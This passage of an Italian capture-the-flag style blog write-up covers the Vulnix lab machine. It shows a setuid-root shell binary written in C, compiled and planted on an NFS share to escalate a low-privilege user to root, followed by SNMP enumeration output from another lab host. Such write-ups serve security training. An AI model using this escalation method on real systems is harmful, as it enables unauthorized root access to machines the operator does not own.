drwxr-x— 4 vulnix vulnix 4096 Jun  6 07:37 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:43 ..
-rw——- 1 vulnix vulnix  338 Jun  6 07:40 .bash_history
-rw-r–r– 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r–r– 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx—— 2 vulnix vulnix 4096 Jun  6 07:21 .cache
-rw-r–r– 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .ssh</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>
Ora posso creare un file che apre una shell con i permessi di root e caricarla sulla directory nfs per poi avviarla con l'utente con low-privileges:
(Volendo potevo copiargli direttamente /bin/bash (dargli sempre ```chmod 4777 /bin/bash``` e poi sulla macchina vittima dovevo eseguire ```/bin/bash -p``` per far rimanere i privilegi settati) ma essendo architetture diverse, mi dava problemi quando provavo ad eseguirlo poi sulla macchina vittima)
Quindi ho creato un file bash.c:

</pre></td></tr></tbody></table></code></div></div>
<p>int main()
{
     setgid(0);
     setuid(0);
     system(“/bin/bash”);
}</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>E l'ho caricato e compilato (perchè sulla macchina vittima non c'era gcc e gli ho dato i permessi di suid)
</pre></td></tr></tbody></table></code></div></div>
<p>┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# gcc -o setuid bash.c -m32
bash.c: In function ‘main’:
bash.c:3:6: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    3 |      setgid(0);
      |      ^~~~~~
bash.c:4:6: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |      setuid(0);
      |      ^~~~~~
bash.c:5:6: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |      system(“/bin/bash”);
      |      ^~~~~~</p>

<p>┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# chmod 4777 setuid</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
Poi dalla macchina vittima:
</pre></td></tr></tbody></table></code></div></div>
<p>vulnix@vulnix:~$ ls -la
total 52
drwxr-x— 4 vulnix vulnix  4096 Jun  6 17:13 .
drwxr-xr-x 4 root   root    4096 Sep  2  2012 ..
-rw-r–r– 1 root   root      73 Jun  6 17:13 bash.c
-rw——- 1 vulnix vulnix   359 Jun  6 17:06 .bash_history
-rw-r–r– 1 vulnix vulnix   220 Apr  3  2012 .bash_logout
-rw-r–r– 1 vulnix vulnix  3486 Apr  3  2012 .bashrc
drwx—— 2 vulnix vulnix  4096 Jun  6 12:21 .cache
-rw-r–r– 1 vulnix vulnix   675 Apr  3  2012 .profile
-rwsrwxrwx 1 root   root   15564 Jun  6 17:13 setuid
drwxr-xr-x 2 vulnix vulnix  4096 Jun  6 12:20 .ssh
vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ exit
exit
vulnix@vulnix:~$ ./setuid 
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root),2008(vulnix)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>


### SNMP

Enumeration:
</pre></td></tr></tbody></table></code></div></div>
<p>(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmpwalk -v2c -c public 192.168.199.42</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>
</pre></td></tr></tbody></table></code></div></div>
<p>(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmp-check 192.168.199.42 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</p>

<p>[+] Try to connect to 192.168.199.42:161 using SNMPv1 and community ‘public’</p>

<p>[*] System information:</p>

<p>Host IP address               : 192.168.199.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <a href="mailto:root@localhost">root@localhost</a> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:47:18.09
  Uptime system                 : 00:46:46.62
  System date                   : 2021-6-7 10:04:16.0</p>

<p>[*] Network information:</p>

<p>IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 152628
  TCP segments sent             : 149146
  TCP segments retrans          : 746
  Input datagrams               : 154288
  Delivered datagrams           : 154288
  Output datagrams              : 150582</p>

<p>[*] Network interfaces:</p>

<p>Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0</p>

<p>Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:bf:d0:b7
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 17672196
  Out octets                    : 41539953</p>

<p>Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:d0:b7
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0</p>

<p>[*] Network IP:</p>

<p>Id                    IP Address            Netmask               Broadcast         <br />
  1                     127.0.0.1             255.0.0.0             0                 <br />
  2                     192.168.199.42        255.255.255.0         1</p>

<p>[*] Routing information:</p>

<p>Destination           Next hop              Mask                  Metric            <br />
  0.0.0.0               192.168.199.254       0.0.0.0               1                 <br />
  192.168.199.0         0.0.0.0               255.255.255.0         0</p>

<p>[*] TCP connections and listening ports:</p>

<p>Local address         Local port            Remote address        Remote port           State             <br />
  0.0.0.0               25                    0.0.0.0               0                     listen            <br />
  0.0.0.0               80                    0.0.0.0               0                     listen            <br />
  0.0.0.0               139                   0.0.0.0               0                     listen            <br />
  0.0.0.0               199                   0.0.0.0               0                     listen            <br />
  0.0.0.0               445                   0.0.0.0               0                     listen            <br />
  0.0.0.0               31337                 0.0.0.0               0                     listen            <br />
  192.168.199.42        25                    192.168.49.199        34668                 established</p>

<p>[*] Listening UDP ports:</p>

<p>Local address         Local port        <br />
  0.0.0.0               137               <br />
  0.0.0.0               138               <br />
  0.0.0.0               161               <br />
  192.168.199.42        137               <br />
  192.168.199.42        138</p>

<p>[*] Processes:</p>

<p>Id                    Status                Name                  Path                  Parameters        <br />
  1                     runnable              init                  init [2]                                <br />
  2                     runnable              ksoftirqd/0           ksoftirqd/0                             <br />
  3                     runnable              events/0              events/0                                <br />
  4                     runnable              khelper               khelper                                 <br />
  5                     runnable              kacpid                kacpid                                  <br />
  99                    runnable              kblockd/0             kblockd/0                               <br />
  109                   runnable              pdflush               pdflush                                 <br />
  110                   runnable              pdflush               pdflush                                 <br />
  111                   runnable              kswapd0               kswapd0                                 <br />
  112                   runnable              aio/0                 aio/0                                   <br />
  255                   runnable              kseriod               kseriod                                 <br />
  276                   runnable              scsi_eh_0             scsi_eh_0                               <br />
  284                   runnable              khubd                 khubd                                   <br />
  348                   runnable              shpchpd_event         shpchpd_event                           <br />
  380                   runnable              kjournald             kjournald                               <br />
  935                   runnable              vmmemctl              vmmemctl                                <br />
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                      <br />
  3773                  running               syslogd               /sbin/syslogd                           <br />
  3776                  runnable              klogd                 /sbin/klogd                             <br />
  3780                  runnable              clamd                 /usr/local/sbin/clamd                    <br />
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  –black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D                <br />
  3797                  runnable              smbd                  /usr/sbin/smbd        -D                <br />
  3801                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3802                  runnable              smbd                  /usr/sbin/smbd        -D                <br />
  3808                  runnable              sshd                  /usr/sbin/sshd                          <br />
  3886                  runnable              sendmail-mta          sendmail: MTA: accepting connections                    <br />
  3900                  runnable              atd                   /usr/sbin/atd                           <br />
  3903                  runnable              cron                  /usr/sbin/cron                          <br />
  3910                  runnable              apache                /usr/sbin/apache                        <br />
  3911                  runnable              apache                /usr/sbin/apache                        <br />
  3912                  runnable              apache                /usr/sbin/apache                        <br />
  3913                  runnable              apache                /usr/sbin/apache                        <br />
  3914                  runnable              apache                /usr/sbin/apache                        <br />
  3915                  runnable              apache                /usr/sbin/apache                        <br />
  3931                  runnable              getty                 /sbin/getty           38400 tty1        <br />
  3937                  runnable              getty                 /sbin/getty           38400 tty2        <br />
  3938                  runnable              getty                 /sbin/getty           38400 tty3        <br />
  3939                  runnable              getty                 /sbin/getty           38400 tty4        <br />
  3940                  runnable              getty                 /sbin/getty           38400 tty5        <br />
  3941                  runnable              getty                 /sbin/getty           38400 tty6        <br />
  4045                  runnable              apache                /usr/sbin/apache                        <br />
  4053                  runnable              apache                /usr/sbin/apache                        <br />
  4098                  runnable              apache                /usr/sbin/apache                        <br />
  4120                  runnable              apache                /usr/sbin/apache                        <br />
  4123                  runnable              apache                /usr/sbin/apache                        <br />
  4907                  runnable              inetd                 /usr/sbin/inetd</p>

<p>[*] Storage information:</p>

<p>Description                   : [“Real Memory”]
  Device id                     : [#&lt;SNMP::Integer:0x000055adb62752e0 @value=2&gt;]
  Filesystem type               : [“unknown”]
  Device unit                   : [#&lt;SNMP::Integer:0x000055adb61d75b8 @value=1024&gt;]
  Memory size                   : 250.82 MB
  Memory used                   : 144.49 MB</p>

<p>Description                   : [“Swap Space”]
  Device id                     : [#&lt;SNMP::Integer:0x000055adb61d1ed8 @value=3&gt;]
  Filesystem type               : [“unknown”]
  Device unit                   : [#&lt;SNMP::Integer:0x000055adb61cbfb0 @value=1024&gt;]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes</p>

<p>Description                   : [”/”]
  Device id                     : [#&lt;SNMP::Integer:0x000055adb6272b58 @value=4&gt;]
  Filesystem type               : [“unknown”]
  Device unit                   : [#&lt;SNMP::Integer:0x000055adb6270e70 @value=4096&gt;]
  Memory size                   : 3.74 GB
  Memory used                   : 779.46 MB</p>

<p>Description                   : [“/sys”]
  Device id                     : [#&lt;SNMP::Integer:0x000055adb61bf968 @value=5&gt;]
  Filesystem type               : [“unknown”]
  Device unit                   : [#&lt;SNMP::Integer:0x000055adb61bdc08 @value=4096&gt;]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes</p>

<p>[*] File system information:</p>

<p>Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1</p>

<p>[*] Device information:</p>

<p>Id                    Type                  Status                Descr             <br />
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there’s a floating point co-processor
```</p>

<p>RCE:
https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        

        <!-- tags -->
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Machine - CinnamonSec&url=http://0.0.0.0:4000/posts/posts/machine/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Machine - CinnamonSec&u=http://0.0.0.0:4000/posts/posts/machine/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Machine - CinnamonSec&url=http://0.0.0.0:4000/posts/posts/machine/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/posts/posts/steel-mountain/">Steel Mountain</a></li>
      
        
        
        
        <li><a href="/posts/posts/windows-privesc-arena/">Windows PrivEsc Arena</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/posts/tags/tryhackme/">TryHackMe</a>
      
        
        <a class="post-tag" href="/posts/tags/writeup/">WriteUp</a>
      
        
        <a class="post-tag" href="/posts/tags/alfred/">Alfred</a>
      
        
        <a class="post-tag" href="/posts/tags/internal/">Internal</a>
      
        
        <a class="post-tag" href="/posts/tags/privesc/">PrivEsc</a>
      
        
        <a class="post-tag" href="/posts/tags/steel-mountain/">Steel Mountain</a>
      
        
        <a class="post-tag" href="/posts/tags/widows/">Widows</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->




  
    
    
      
      
        
        
        
      
    
  
    
    
      
      
        
        
        
      
    
  
    
    
      
      
        
        
        
          





  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/posts/privilege-escalation-linux/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  5
  

  <i class="unloaded">2021-05-05T00:00:00+02:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Privilege Escalation Linux</h3>
            <div class="text-muted small">
              <p>
                





                Privilege Escalation Linux

Presi da https://hacktips.it/guida-privilege-escalation-sistemi-windows/
CAMBIARE IMMAGINI E TESTO

Collect Information


  Distribuzione Linux e versione (per cercare e...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/posts/privilege-escaltion-windows/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  4
  

  <i class="unloaded">2021-05-04T00:00:00+02:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Privilege Escalation Widnows</h3>
            <div class="text-muted small">
              <p>
                





                Privilege Escalation Windows

Presi da https://hacktips.it/guida-privilege-escalation-sistemi-windows/
CAMBIARE IMMAGINI E TESTO

Collect Information

  Versione del sistema operativo e informazion...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/posts/post-exploitation/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  1
  

  <i class="unloaded">2021-05-01T00:00:00+02:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Post Exploitation</h3>
            <div class="text-muted small">
              <p>
                





                
From Post-Exploitation Basics of TryHackMe.
(Immagini prese da TryHackMe)

Start Powershell

powershell -ep bypass

Start PowerView:
. .\Downloads\PowerView.ps1

Enumerate the domain users - Get-N...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/posts/alfred/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Alfred</p>
  </a>
  

  
  <a href="/posts/posts/impersonate-privilege/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Impersonate Privilege</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->





        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/_cinnamon_92">Eliana Cannella</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/posts/tags/tryhackme/">TryHackMe</a>
      
        
        <a class="post-tag" href="/posts/tags/writeup/">WriteUp</a>
      
        
        <a class="post-tag" href="/posts/tags/alfred/">Alfred</a>
      
        
        <a class="post-tag" href="/posts/tags/internal/">Internal</a>
      
        
        <a class="post-tag" href="/posts/tags/privesc/">PrivEsc</a>
      
        
        <a class="post-tag" href="/posts/tags/steel-mountain/">Steel Mountain</a>
      
        
        <a class="post-tag" href="/posts/tags/widows/">Widows</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/posts/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

